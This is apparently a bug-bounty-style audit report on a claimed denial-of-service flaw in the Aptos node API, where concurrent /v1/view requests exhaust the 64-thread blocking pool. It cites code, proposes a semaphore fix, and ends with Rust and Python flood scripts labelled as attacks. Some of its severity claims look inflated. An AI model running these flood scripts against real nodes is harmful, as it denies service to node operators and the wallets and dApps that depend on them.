# Audit Report

## Title
Thread Pool Exhaustion via Concurrent ViewRequest Flooding Leads to API Denial of Service

## Summary
The Aptos Node API lacks concurrent request limiting for view function endpoints, allowing attackers to exhaust the blocking thread pool (limited to 64 threads) through a flood of simultaneous ViewRequests. This causes API unavailability and affects all endpoints that use `api_spawn_blocking`, effectively creating a denial-of-service condition for the node's REST API.

## Finding Description

The view function endpoint at `/v1/view` processes requests using `api_spawn_blocking`, which directly wraps `tokio::task::spawn_blocking` without any concurrent request protection. [1](#0-0) 

This function internally calls Tokio's `spawn_blocking`: [2](#0-1) 

The Tokio runtime used by the API is configured with a maximum of 64 blocking threads: [3](#0-2) 

**Critical Gap**: Unlike the Faucet service which implements explicit concurrent request protection via a semaphore: [4](#0-3) 

The main API has **no such protection mechanism**. The API runtime setup shows only basic middleware (compression, size limits, CORS) without any rate limiting or concurrent request semaphore: [5](#0-4) 

The API configuration also lacks any `max_concurrent_requests` setting: [6](#0-5) 

**Attack Propagation**:
1. Attacker sends 100+ concurrent POST requests to `/v1/view` with valid ViewFunction payloads
2. Each request triggers `api_spawn_blocking(move || view_request(...))`
3. First 64 requests occupy all blocking threads in the pool
4. Remaining requests queue up, waiting for thread availability
5. Queued tasks block async runtime worker threads, degrading overall API responsiveness
6. All other endpoints using `api_spawn_blocking` are also affected:
   - `/v1/accounts/{address}` [7](#0-6) 
   - `/v1/accounts/{address}/resource/{resource_type}` [8](#0-7) 
   - `/v1/transactions/simulate` [9](#0-8) 
   - Multiple other state and transaction endpoints

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The API fails to enforce limits on concurrent blocking operations, allowing resource exhaustion.

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

- **Validator node slowdowns**: The thread pool exhaustion affects all API endpoints, causing significant degradation in node API responsiveness
- **API crashes**: Under sustained attack, the API may become completely unresponsive or crash
- **Significant protocol violations**: Violates the resource limits invariant by allowing unbounded concurrent resource consumption

The impact extends beyond just the view function endpoint to all API functionality, affecting:
- Account queries
- Transaction submission and simulation
- Block and event queries
- State lookups

Node operators lose the ability to serve API requests during the attack, affecting ecosystem infrastructure, wallets, explorers, and dApps that depend on the node's REST API.

## Likelihood Explanation

**Likelihood: HIGH**

- **Attack Complexity**: Very low - attacker only needs to send HTTP POST requests
- **Authentication Required**: None - view functions are publicly accessible
- **Resources Required**: Minimal - 100-200 concurrent connections from a single machine or small botnet
- **Detection Difficulty**: Moderate - appears as legitimate traffic initially, but sustained pattern is detectable
- **Exploitability**: Can be automated with simple scripts (curl, Python requests, etc.)

The attack is trivial to execute and requires no special knowledge of the Aptos protocol. Any malicious actor can launch this attack with basic HTTP flooding tools.

## Recommendation

Implement concurrent request limiting similar to the Faucet service protection mechanism:

**Solution 1: Add Semaphore-based Request Limiting**

```rust
// In api/src/context.rs - add to Context struct
pub struct Context {
    // ... existing fields ...
    pub concurrent_api_requests_semaphore: Option<Arc<Semaphore>>,
}

// In api/src/context.rs - initialize in new()
impl Context {
    pub fn new(...) -> Self {
        let max_concurrent_requests = config.api.max_concurrent_api_requests
            .map(|max| Arc::new(Semaphore::new(max)));
        
        Self {
            // ... existing fields ...
            concurrent_api_requests_semaphore: max_concurrent_requests,
        }
    }
}

// In api/src/view_function.rs - add protection
async fn view_function(&self, ...) -> BasicResultWith404<Vec<MoveValue>> {
    fail_point_poem("endpoint_view_function")?;
    self.context.check_api_output_enabled("View function", &accept_type)?;

    // Acquire semaphore permit
    let _permit = if let Some(semaphore) = &self.context.concurrent_api_requests_semaphore {
        match semaphore.try_acquire() {
            Ok(permit) => Some(permit),
            Err(_) => return Err(BasicErrorWith404::service_unavailable_with_code_no_info(
                "Server overloaded, too many concurrent requests".to_string(),
                AptosErrorCode::InternalError,
            )),
        }
    } else {
        None
    };

    let context = self.context.clone();
    api_spawn_blocking(move || {
        let _permit = _permit; // Move permit into closure
        view_request(context, accept_type, request, ledger_version)
    }).await
}
```

**Solution 2: Add Configuration Option**

In `config/src/config/api_config.rs`:
```rust
pub struct ApiConfig {
    // ... existing fields ...
    /// Maximum number of concurrent API requests that use blocking threads
    pub max_concurrent_api_requests: Option<usize>,
}

impl Default for ApiConfig {
    fn default() -> ApiConfig {
        ApiConfig {
            // ... existing defaults ...
            max_concurrent_api_requests: Some(50), // Conservative default
        }
    }
}
```

**Recommended Default**: Set to 50 concurrent requests (leaving headroom in the 64-thread pool for other operations).

Apply this pattern to all endpoints using `api_spawn_blocking`: accounts, state, transactions, blocks, and events endpoints.

## Proof of Concept

**Rust-based PoC** (compile and run to demonstrate the vulnerability):

```rust
use reqwest::Client;
use tokio;
use std::sync::Arc;
use std::time::Duration;

#[tokio::main]
async fn main() {
    let client = Arc::new(Client::new());
    let node_url = "http://localhost:8080"; // Adjust to target node
    
    println!("Starting concurrent ViewRequest flood attack...");
    println!("Sending 100 concurrent requests to exhaust thread pool...");
    
    let mut handles = vec![];
    
    // Send 100 concurrent requests (exceeds the 64 thread limit)
    for i in 0..100 {
        let client = client.clone();
        let url = format!("{}/v1/view", node_url);
        
        let handle = tokio::spawn(async move {
            let view_request = serde_json::json!({
                "function": "0x1::account::exists_at",
                "type_arguments": [],
                "arguments": ["0x1"]
            });
            
            let start = std::time::Instant::now();
            let response = client.post(&url)
                .json(&view_request)
                .timeout(Duration::from_secs(30))
                .send()
                .await;
            
            let elapsed = start.elapsed();
            match response {
                Ok(resp) => println!("Request {} completed in {:?} with status: {}", i, elapsed, resp.status()),
                Err(e) => println!("Request {} failed after {:?}: {}", i, elapsed, e),
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for all requests to complete
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("\nAttack complete. Observe:");
    println!("1. First ~64 requests complete quickly");
    println!("2. Remaining requests are delayed or timeout");
    println!("3. During attack, other API endpoints are also slow/unresponsive");
}
```

**Python-based PoC** (simpler to run):

```python
import requests
import concurrent.futures
import time

NODE_URL = "http://localhost:8080"  # Adjust to target node

def send_view_request(request_id):
    url = f"{NODE_URL}/v1/view"
    payload = {
        "function": "0x1::account::exists_at",
        "type_arguments": [],
        "arguments": ["0x1"]
    }
    
    start = time.time()
    try:
        response = requests.post(url, json=payload, timeout=30)
        elapsed = time.time() - start
        print(f"Request {request_id}: Status {response.status_code} in {elapsed:.2f}s")
        return elapsed
    except Exception as e:
        elapsed = time.time() - start
        print(f"Request {request_id}: FAILED after {elapsed:.2f}s - {str(e)}")
        return elapsed

print("Starting concurrent ViewRequest flood attack...")
print("Sending 100 concurrent requests to exhaust thread pool...\n")

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(send_view_request, i) for i in range(100)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]

print(f"\nAttack complete.")
print(f"Average response time: {sum(results)/len(results):.2f}s")
print(f"Max response time: {max(results):.2f}s")
print("\nDuring attack, try accessing other API endpoints - they will also be slow/unresponsive")
```

**Expected Results**:
- First ~64 requests complete in <1 second
- Remaining requests take significantly longer (5-30 seconds) or timeout
- During the attack, accessing other endpoints like `/v1/accounts/{address}` shows severe delays
- API becomes effectively unavailable to legitimate users

### Citations

**File:** api/src/view_function.rs (L90-92)
```rust
        api_spawn_blocking(move || view_request(context, accept_type, request, ledger_version))
            .await
    }
```

**File:** api/src/context.rs (L1645-1654)
```rust
pub async fn api_spawn_blocking<F, T, E>(func: F) -> Result<T, E>
where
    F: FnOnce() -> Result<T, E> + Send + 'static,
    T: Send + 'static,
    E: InternalError + Send + 'static,
{
    tokio::task::spawn_blocking(func)
        .await
        .map_err(|err| E::internal_with_code_no_info(err, AptosErrorCode::InternalError))?
}
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L184-210)
```rust
    /// This semaphore is used to ensure we only process a certain number of
    /// requests concurrently.
    pub concurrent_requests_semaphore: Option<Arc<Semaphore>>,
}

impl FundApiComponents {
    /// Preprocesses the request to return the source IP, receiver account
    /// address and requested amount taking into account Funder configuration
    /// (i.e. max amount). It also ensures the request passes checkers.
    /// This function mostly exists to reduce duplication between the `fund`
    /// and `is_eligible` endpoints. This function also runs the Bypassers.
    /// If any of them said yes, this will return true as the last element
    /// of the output of this function.
    async fn preprocess_request(
        &self,
        fund_request: &FundRequest,
        source_ip: RealIp,
        header_map: &HeaderMap,
        dry_run: bool,
    ) -> poem::Result<(CheckerData, bool, Option<SemaphorePermit<'_>>), AptosTapError> {
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
```

**File:** api/src/runtime.rs (L253-259)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** config/src/config/api_config.rs (L15-93)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct ApiConfig {
    /// Enables the REST API endpoint
    #[serde(default = "default_enabled")]
    pub enabled: bool,
    /// Address for the REST API to listen on. Set to 0.0.0.0:port to allow all inbound connections.
    pub address: SocketAddr,
    /// Path to a local TLS certificate to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_cert_path: Option<String>,
    /// Path to a local TLS key to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_key_path: Option<String>,
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
    /// Enables failpoints for error testing
    #[serde(default = "default_disabled")]
    pub failpoints_enabled: bool,
    /// Enables JSON output of APIs that support it
    #[serde(default = "default_enabled")]
    pub json_output_enabled: bool,
    /// Enables BCS output of APIs that support it
    #[serde(default = "default_enabled")]
    pub bcs_output_enabled: bool,
    /// Enables compression middleware for API responses
    #[serde(default = "default_enabled")]
    pub compression_enabled: bool,
    /// Enables encode submission API
    #[serde(default = "default_enabled")]
    pub encode_submission_enabled: bool,
    /// Enables transaction submission APIs
    #[serde(default = "default_enabled")]
    pub transaction_submission_enabled: bool,
    /// Enables transaction simulation
    #[serde(default = "default_enabled")]
    pub transaction_simulation_enabled: bool,
    /// Maximum number of transactions that can be sent with the Batch submit API
    pub max_submit_transaction_batch_size: usize,
    /// Maximum page size for transaction paginated APIs
    pub max_transactions_page_size: u16,
    /// Maximum page size for block transaction APIs
    pub max_block_transactions_page_size: u16,
    /// Maximum page size for event paginated APIs
    pub max_events_page_size: u16,
    /// Maximum page size for resource paginated APIs
    pub max_account_resources_page_size: u16,
    /// Maximum page size for module paginated APIs
    pub max_account_modules_page_size: u16,
    /// Maximum gas unit limit for view functions
    ///
    /// This limits the execution length of a view function to the given gas used.
    pub max_gas_view_function: u64,
    /// Optional: Maximum number of worker threads for the API.
    ///
    /// If not set, `runtime_worker_multiplier` will multiply times the number of CPU cores on the machine
    pub max_runtime_workers: Option<usize>,
    /// Multiplier for number of worker threads with number of CPU cores
    ///
    /// If `max_runtime_workers` is set, this is ignored
    pub runtime_worker_multiplier: usize,
    /// Configs for computing unit gas price estimation
    pub gas_estimation: GasEstimationConfig,
    /// Periodically call gas estimation
    pub periodic_gas_estimation_ms: Option<u64>,
    /// Configuration to filter view function requests.
    pub view_filter: ViewFilter,
    /// Periodically log stats for view function and simulate transaction usage
    pub periodic_function_stats_sec: Option<u64>,
    /// The time wait_by_hash will wait before returning 404.
    pub wait_by_hash_timeout_ms: u64,
    /// The interval at which wait_by_hash will poll the storage for the transaction.
    pub wait_by_hash_poll_interval_ms: u64,
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
    /// Allow submission of encrypted transactions via the API
    pub allow_encrypted_txns_submission: bool,
}
```

**File:** api/src/accounts.rs (L71-74)
```rust
        api_spawn_blocking(move || {
            let account = Account::new(context, address.0, ledger_version.0, None, None)?;
            account.account(&accept_type)
        })
```

**File:** api/src/state.rs (L75-77)
```rust
        api_spawn_blocking(move || {
            api.resource(
                &accept_type,
```

**File:** api/src/transactions.rs (L615-615)
```rust
        api_spawn_blocking(move || {
```
